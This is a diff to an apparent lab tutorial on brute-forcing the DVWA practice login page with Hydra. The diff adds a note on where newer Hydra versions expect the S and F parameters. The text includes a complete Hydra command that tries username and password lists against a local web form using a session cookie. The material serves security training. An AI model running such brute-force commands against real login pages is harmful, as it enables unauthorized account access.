@@ -78,6 +78,8 @@ Then it is just to execute the Hydra tool, passing as parameters the usernames a
 
     hydra  -L ./usernames.txt  -P ./passwords.txt -e ns  -F  -u  -t 1  -w 10  -v  -V  127.0.0.1  http-get-form  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=${SESSIONID}:S=Welcome to the password protected area"
 
+Note: according to the newest versions of Hydra, '`S`' and '`F`' parameters should be passed to the end of validation string. This is particularly relevant if you receive the following error "`[ERROR] no valid optional parameter type given: F`" or "`[ERROR] no valid optional parameter type given: S`".
+
 And the result is as follows:
 
     Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
